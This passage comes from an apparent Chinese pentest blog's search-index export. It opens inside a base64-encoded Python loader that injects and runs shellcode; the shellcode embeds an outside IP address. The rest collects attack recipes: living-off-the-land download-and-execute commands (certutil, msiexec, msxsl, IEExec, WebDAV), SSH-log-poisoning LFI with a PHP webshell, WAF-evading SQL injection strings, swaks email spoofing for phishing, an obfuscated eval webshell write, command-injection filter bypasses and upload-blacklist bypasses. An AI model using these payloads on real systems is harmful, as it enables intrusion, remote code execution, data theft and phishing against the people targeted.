QxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceGU4XHg4MFx4MDBceDAwXHgwMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzlceDJlXHgzMFx4M2JceDIwXHg1N1x4NjlceDZlXHg2NFx4NmZceDc3XHg3M1x4MjBceDRlXHg1NFx4MjBceDM2XHgyZVx4MzFceDNiXHgyMFx4NTdceDRmXHg1N1x4MzZceDM0XHgzYlx4MjBceDU0XHg3Mlx4NjlceDY0XHg2NVx4NmVceDc0XHgyZlx4MzVceDJlXHgzMFx4M2JceDIwXHg0Mlx4NGZceDQ5XHg0NVx4MzlceDNiXHg0NVx4NGVceDU1XHg1M1x4NGRceDUzXHg0NVx4MjlceDAwXHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDAwXHg1OVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NDFceDUwXHg0MVx4NTBceDQxXHhiYVx4M2FceDU2XHg3OVx4YTdceGZmXHhkNVx4ZWJceDYxXHg1YVx4NDhceDg5XHhjMVx4NDFceGI4XHhiOFx4MjJceDAwXHgwMFx4NGRceDMxXHhjOVx4NDFceDUxXHg0MVx4NTFceDZhXHgwM1x4NDFceDUxXHg0MVx4YmFceDU3XHg4OVx4OWZceGM2XHhmZlx4ZDVceGViXHg0NFx4NDhceDg5XHhjMVx4NDhceDMxXHhkMlx4NDFceDU4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NjBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NmFceDBhXHg1Zlx4NDhceDg5XHhmMVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NTJceDUyXHg0MVx4YmFceDJkXHgwNlx4MThceDdiXHhmZlx4ZDVceDg1XHhjMFx4NzVceDFkXHg0OFx4ZmZceGNmXHg3NFx4MTBceGViXHhkZlx4ZWJceDYzXHhlOFx4YjdceGZmXHhmZlx4ZmZceDJmXHg2Ylx4NTRceDQ4XHg1Nlx4MDBceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceGMzXHhlOFx4MzVceGZmXHhmZlx4ZmZceDMxXHgzMFx4MzNceDJlXHgzMlx4MzNceDM4XHgyZVx4MzJceDMyXHgzNVx4MmVceDMxXHgzMlx4MzlceDAwIiAKZWxzZToKCXNoZWxsY29kZSA9ICIiCgojIHNhbml0eSBjaGVjayBvdXIgc2l0dWF0aW9uCmlmIHR5cGUgIT0gIldpbmRvd3NQRSIgb3IgbGVuKHNoZWxsY29kZSkgPT0gMDoKCXF1aXQoKQoKIyBpbmplY3Qgb3VyIHNoZWxsY29kZQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpCg==&quot;)8、certutileg: certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp; del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete9、msiexecmsiexec /q /i http://site.com/payloads/calc.pngcalc.pngmsfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png10、msxsl.exe(需下载)eg: msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl demo.xml &lt;?xml version=&quot;1.0&quot;?&gt; &lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt; &lt;customers&gt; &lt;customer&gt; &lt;name&gt;Microsoft&lt;/name&gt; &lt;/customer&gt; &lt;/customers&gt; exec.xsl &lt;?xml version=&apos;1.0&apos;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt; &lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt; function xml(nodelist) { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;); return nodelist.nextNode().xml; } &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;11、IEExeceg: C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s off C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http://site.com/files/test64.exe 细节：戳我 12、IEXPLORE.EXE这个需要IE存在可执行命令的漏洞eg: &quot;C:\Program Files\Internet Explorer\IEXPLORE.EXE&quot; http://site.com/expexp可以使用类似ms14_064 13、当使用UNC/WebDAV时候多的几种姿势Cmd cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt Cscript/Wscript cscript //E:jscript \\webdavserver\folder\payload.txt Regasm/RegsvcC:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \webdavserver\folder\payload.dlldll 可以使用C#写的 Msbuildcmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot; pcalua.exe pcalua.exe -a \\server\payload.dll]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LFI_SSH日志]]></title>
    <url>%2Farchives%2F8946a683.html</url>
    <content type="text"><![CDATA[登陆SSH：ssh &apos;&lt;?php system($_GET[‘c’]); ?&gt;&apos;@192.168.1.105包含文件：http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果。有16字符可控，足够了。 只可以没有x权限，要不然ssrf fastcgi就有意思了。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[WAF是如何被绕过的？SQL注入常见手法解密。]]></title>
    <url>%2Farchives%2F7bcebf52.html</url>
    <content type="text"><![CDATA[常见的关系型数据库有mysql、SQL Server、Oracle、Sybase、DB2等。sql语句标准语句写法相同，但由于不同数据库都有自己专用函数，因此过滤的规则可能也有所不同。因常见数据库都为mysql，因此以下以mysql数据库标准语句举例： 关键字：and,or,select,update,delete,create,union,insert,net,truncate,exec,drop,declare,count,chr,mid,master,char,Sp_sqlexec,order by,where,limit等关键字符：&quot; &apos; &quot;(单引号)、&quot; &lt; &quot;（小于号）、&quot; &gt; &quot;(大于号)、&quot; ; &quot;(冒号)、&quot; ( &quot;(括号)、&quot; ) &quot;（括号）、&quot; * &quot;(星号)、&quot; % &quot;(百分号)、&quot; &quot;（空格）、&quot; -- &quot;(sql中的注释符)、&quot;#&quot;等sql绕过方法大全：1、大小写绕过例如And、anD2、编码绕过例如%55nIon(union)、%53elect(select)【url编码绕过、十六进制编码绕过、unicode编码绕过】3、特殊字符转换例如and可替换为&amp;&amp;、or可替换为||、空格过滤转换为%0a,+,或者/**/,%20,%09,%0b,%0c,%0d,%a0、“=”转换为like,greatest,between4、注释绕过例如un/**/ion、se/**/lect （常用注释符：//,-- ,/**/, #,--+,-- -,;--a ），内联注释绕过、/*!UNION*/5、等价函数与命令有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用 例如：hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir()6、使用一些特殊字符也可对其进行绕过，例如：`、~、!、@、()、[]、.、-、+ 、|、%00，举例关键字拆分：&apos;se&apos;+&apos;lec&apos;+&apos;t&apos;、(SeL)(EcT)等7、http参数控制HPP(HTTP Parameter Polution)又称做重复参数污染最简单的就是?uid=1&amp;uid=2&amp;uid=3对于这种情况不同的Web服务器处理方式不一样 举例：/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users8、缓冲区溢出举例?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A&quot;重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出9、整合绕过整合的意思是结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了 举例： id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - 即： 注释+大小写+特殊字符绕过复杂的SQL注入常见手大体如此，WAF是如何被绕过的？这样就清楚了。那么我们在开发中，如何防止SQL注入，如何防止waf防绕过，心中也就有些眉目，就知道该如何应对了。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[邮箱伪造]]></title>
    <url>%2Farchives%2F368c71e.html</url>
    <content type="text"><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？ 现如今的钓鱼邮件都是通过注册相似的邮箱，或者设置邮箱的显示名称，盼着被害人有看走眼的那一刻，轻信邮件的内容。这种方法需要一定的社工技巧，以及诱导性的语言来诱使被害人上钩。但是对于有一定的经验以及眼力的人来说，还是可以识破骗子的伎俩。 下面我要介绍的这款工具可以最大程度的欺骗你的邮箱，更不要提你的眼睛。当然，此方法不是适用于任何邮箱，毕竟每种邮箱的过滤机制都不相同。gmail在这方面就做的不错。 Swaks - SMTP界的瑞士军刀基本用法： swaks –to &lt;要测试的邮箱&gt; 用来测试邮箱的连通性 root@kali:~# swaks --to xxxx@qq.com === Trying mx3.qq.com:25... === Connected to mx3.qq.com. &lt;- 220 newmx59.qq.com MX QQ Mail Server -&gt; EHLO kali &lt;- 250-newmx59.qq.com &lt;- 250-SIZE 73400320 &lt;- 250-STARTTLS &lt;- 250 OK -&gt; MAIL FROM:&lt;root@kali&gt; &lt;- 250 Ok -&gt; RCPT TO:&lt;xxxx@qq.com&gt; &lt;- 250 Ok -&gt; DATA &lt;- 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Tue, 05 Jan 2016 23:15:11 -0500 -&gt; To: xxxx@qq.com -&gt; From: root@kali -&gt; Subject: test Tue, 05 Jan 2016 23:15:11 -0500 -&gt; X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/ -&gt; -&gt; This is a test mailing -&gt; -&gt; . &lt;** 550 Mail content denied. http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=20022&amp;&amp;no=1000726 -&gt; QUIT &lt;- 221 Bye === Connection closed with remote host.前面都返回250ok，说明该邮箱存在，并且可以正常收信。最后可以看到qq邮箱返回550错误，qq官方给出的出错原因：该邮件内容涉嫌大量群发，并且被多数用户投诉为垃圾邮件。 我们可以继续对邮件进行伪造，来绕过qq邮箱的判断 比如： swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;其中： –from &lt;要显示的发件人邮箱&gt; –ehlo &lt;伪造的邮件ehlo头&gt; –body &lt;邮件正文&gt; –header &lt;邮件头信息，subject为邮件标题&gt;在你ip没有被qq邮箱band的情况下，邮件可以正常发送，返回250 ok。 高级用法：使用swaks其实还可以进行更高级的邮件伪造，几乎可以伪造邮件中的每一个参数。 –data &lt;源邮件&gt; 首先，我们需要一份正常的邮件 M亲测可用的伪造邮箱方法 swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>知识科普</tag>
        <tag>奇淫技巧</tag>
        <tag>社工</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Thinkphp_漏洞列表]]></title>
    <url>%2Farchives%2Ff1b53e95.html</url>
    <content type="text"><![CDATA[Thinkphp-漏洞列表:`https://github.com/Maikefee/pochubs`Thinkphp3.2.3最新版update注入漏洞`https://www.anquanke.com/post/id/104847`ThinkPHP5.0.10-3.2.3缓存函数设计缺陷可导致Getshell:https://xz.aliyun.com/t/99]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>常见Cms漏洞</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux通配符绕过文件名黑名单]]></title>
    <url>%2Farchives%2F18ca0ec6.html</url>
    <content type="text"><![CDATA[文章来源: http://www.sohu.com/a/235200861_658302 通配符绕过黑名单,做免杀还是蛮有意思的,先做记录 1.原本的payload cmd=/bin/echo &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php 2.变形后的payload： cmd=/???/e??? &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Linux特性</category>
      </categories>
      <tags>
        <tag>Linux特性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于命令执行以及常见的一些绕过过滤的方法_浅谈CTF中命令执行与绕过的小技巧]]></title>
    <url>%2Farchives%2Fc6ef1d37.html</url>
    <content type="text"><![CDATA[https://blog.csdn.net/silence1_/article/details/96135760 http://pupiles.com/shellcode.html命令执行的一些绕过技巧 ① 空格过滤空格可以用以下字符串代替：&lt; 、%09、$IFS$9、 ${IFS}等 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 ② 一些命令分隔符%0a 符号、%0d 符号、; 符号、&amp; 符号、| 符号1、在 shell 中，担任”连续指令”功能的符号就是”;”2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示 ③ 黑名单绕过1、拼接绕过比如：a=l;b=s;$a$b 上面的第二道题目也是利用偶读拼接方法绕过黑名单：a=fl;b=ag;cat $a$b2、base64解码绕过比如：echo MTIzCg==|base64 -d 其将会打印1233、单引号和双引号绕过比如：ca&apos;&apos;t flag 或ca&quot;&quot;t flag4、反斜杠绕过比如：ca\t fl\ag④长度限制长度限制可以用文件构造的方式来绕过。linux下可以用 1&gt;a创建文件名为a的空文件ls -t&gt;test则会将目录按时间排序后写进test文件中sh命令可以从一个文件中读取命令来执行 利用这些特性，即可以成功绕过长度限制来执行命令。\ M 亲测有效浅谈CTF中命令执行与绕过的小技巧]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Part1:黑名单上传之00截断失败的情况下绕过(Win+Php5.4.45)]]></title>
    <url>%2Farchives%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[一、前言大家好,我叫MaiKeFee,是一名信息安全爱好者,初次见面,先水一篇文章再说.前几天在深圳出差,遇到一个黑名单上传点(Linux+Php(版本未知)),除了Php|Aspx|Jsp|Php3等等类似脚本都试过不能上传,其余可上传;于是第一时间想到测试%00截断显然是不能上传,不然也不会有此下文. 随后随手测试了: %00截断不能上传(实战环境+Linux+nginx+php(未知版本)),但是%0a、%0d,没想到竟然能上传了!!但是很遗憾,它不解析;为了寻找原因开始搭建环境复现.. 二、环境搭建 哒哒哒,环境搭好了,接下来开始测试啦 测试环境:Win+phpstudy(PHP Version 5.4.45)+上传黑名单 1.测试%00截断(上传成功并解析) 2.接下来是测试%0a截断(上传成功并解析) 3.接下来是测试%0d截断(上传失败并报错) 三、Fuzzing根据这样的特性,写个脚本生成Payload(%00-%99)(a-z)进行fuzzing 拿起来fuzzing就是一把梭 经过梭哈后,发现这些空payload,基本都可以绕过黑名单(%00|%0a|%8b|%8c|%8d..) 当然,要是提到黑名单绕过的姿势还是挺多的: 1.根据win的特性,空格也是可以绕过的2.::$DATA数据流绕过,NTFS文件系统特性绕过 3.php3、php5..4.点号(.)绕过,Win特性… 就不一一举例,本人项目环境是(Linux+nginx),绕过黑名单,但是不解析,在Win下测试,绕过后可解析(暂没深入)..总结:遇到00截断不成功的情况下,测试了0a可以成功绕过(估计跟php版本有关,待考察) 但是值得一提的是此文和网上提到https://www.freebuf.com/articles/web/179401.html 这里均提到版本问题,但本人测试环境Php5.4.45,可00截断并解析,这里暂时无从考证了,知道的大佬指点一下迷津!]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>上传漏洞</category>
      </categories>
  </entry>
</search>
